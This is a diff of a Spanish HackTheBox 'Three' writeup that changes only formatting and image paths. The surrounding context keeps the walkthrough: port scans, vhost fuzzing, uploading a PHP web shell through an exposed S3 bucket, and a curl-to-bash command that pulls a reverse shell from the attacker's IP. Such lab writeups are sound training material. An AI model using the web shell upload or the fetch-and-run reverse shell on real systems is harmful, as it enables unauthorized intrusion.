@@ -1,12 +1,6 @@
 # Three
 
-Plataforma: HackTheBox
-OS: Linux
-Level: Easy
-Status: Done
-Complete: Yes
-Created time: 5 de diciembre de 2024 17:37
-IP: 10.129.203.61
+Plataforma: HackTheBox OS: Linux Level: Easy Status: Done Complete: Yes Created time: 5 de diciembre de 2024 17:37 IP: 10.129.203.61
 
 ## Recopilación de información
 
@@ -14,38 +8,34 @@ IP: 10.129.203.61
 
 Comenzamos con un escaneo para identificar que puertos están abiertos.
 
----
+***
 
-<aside>
 💡 NMAP
-
-</aside>
 
 ```bash
 ❯ sudo nmap -p- --open -T5 -sS --min-rate 5000 -vvv -n -Pn 10.129.242.54 -oG targeted
 ```
 
-![image.png](/images/HackTheBox/image.png)
+![image.png](<../../.gitbook/assets/image (1).png>)
 
 ```bash
 sudo namp -p22,80 -SCV 10.129.242.54 -oN tallports
 ```
 
-![image.png](/images/HackTheBox/image%201.png)
+![image.png](<../../.gitbook/assets/image 1 (1).png>)
 
 ### **Enumeración de servicios**
 
 Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.
 
----
+***
 
-- **Identificación de vulnerabilidades**
-    - 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-    - 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+* **Identificación de vulnerabilidades**
+  * 80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
+  * 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+* **Web Discovery**
 
-- **Web Discovery**
-
-![image.png](/images/HackTheBox/image%202.png)
+![image.png](<../../.gitbook/assets/image 2 (1).png>)
 
 ```bash
 echo "10.129.203.61 thetoppers.htb" | sudo tee -a /etc/hosts
@@ -64,7 +54,7 @@ gobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/sub
 wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host:FUZZ.thetoppers.htb" -u 10.129.203.61 --hl=234   
 ```
 
-![image.png](/images/HackTheBox/image%203.png)
+![image.png](<../../.gitbook/assets/image 3 (1).png>)
 
 Añadimos el subdominio al etc/host
 
@@ -74,7 +64,7 @@ echo "10.129.203.61 thetoppers.htb,s3.thetoppers.htb" | sudo tee -a /etc/hosts
 
 Visitamos el subdominio: s3.thetoppers.htb
 
-![image.png](/images/HackTheBox/image%204.png)
+![image.png](<../../.gitbook/assets/image 4 (1).png>)
 
 Hacemos fuzzing:
 
@@ -82,7 +72,7 @@ Hacemos fuzzing:
 gobuster dir -u http://s3.thetoppers.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 ```
 
-![image.png](/images/HackTheBox/image%205.png)
+![image.png](<../../.gitbook/assets/image 5 (1).png>)
 
 ## Explotación
 
@@ -94,19 +84,19 @@ Seguimos configuracion de AWS:
 aws configure
 ```
 
-![image.png](/images/HackTheBox/image%206.png)
+![image.png](<../../.gitbook/assets/image 6 (1).png>)
 
 ```bash
 aws --endpoint=http://s3.thetoppers.htb s3 ls 
 ```
 
-![image.png](/images/HackTheBox/image%207.png)
+![image.png](<../../.gitbook/assets/image 7 (1).png>)
 
 ```bash
 aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
 ```
 
-![image.png](/images/HackTheBox/image%208.png)
+![image.png](<../../.gitbook/assets/image 8 (1).png>)
 
 Probamos a subir un fichero a la raiz del servidor :
 
@@ -121,13 +111,13 @@ Lo subimos mediante:
 aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
 ```
 
-Accedemos a : 
+Accedemos a :
 
 ```html
 http://thetoppers.htb/shell.php?cmd=id
 ```
 
-![image.png](/images/HackTheBox/image%209.png)
+![image.png](<../../.gitbook/assets/image 9 (1).png>)
 
 Creamos un fichero que al llamarlo por curl, nos de acceso a una rever shell: rever.sh
 
@@ -155,31 +145,20 @@ http://thetoppers.htb/shell.php?cmd=curl%2010.10.16.76:8080/rever.sh|bash
 
 ```
 
-Obtenemos acceso a la maquina: 
+Obtenemos acceso a la maquina:
 
-![image.png](/images/HackTheBox/image%2010.png)
+![image.png](<../../.gitbook/assets/image 10 (1).png>)
 
 ## Explotación posterior
 
-<aside>
 💡 Buscamos la Flag
-
-</aside>
 
 ```bash
 find / -name  "flag.txt"
 ```
 
-![image.png](/images/HackTheBox/image%2011.png)
+![image.png](<../../.gitbook/assets/image 11 (1).png>)
 
 ## Conclusión
 
-<aside>
-💡 No he podido resolver la maquina sin writteup por el tema de AWS.
-
-</aside>
-
-<aside>
-💡 No hay escalada de privilegios.
-
-</aside>
+💡 No he podido resolver la maquina sin writteup por el tema de AWS.💡 No hay escalada de privilegios.
